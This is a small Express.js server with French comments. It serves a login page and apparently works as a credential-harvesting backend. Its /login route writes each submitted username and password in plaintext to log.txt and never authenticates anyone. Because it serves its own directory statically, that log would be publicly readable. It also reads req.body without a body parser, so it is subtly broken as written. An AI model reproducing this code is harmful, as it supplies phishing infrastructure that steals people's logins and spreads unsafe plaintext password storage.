const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

// Middleware pour servir les fichiers statiques (comme CSS, images, etc.)
app.use(express.static(path.join(__dirname)));

// Route principale pour servir index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Route POST pour la connexion (ajout des logs)
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const log = `Nom d'utilisateur: ${username}, Mot de passe: ${password}\n`;
    fs.appendFileSync('log.txt', log); // Crée/ajoute dans log.txt
    res.json({ message: "Identifiants reçus" });
});

// Démarrer le serveur
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
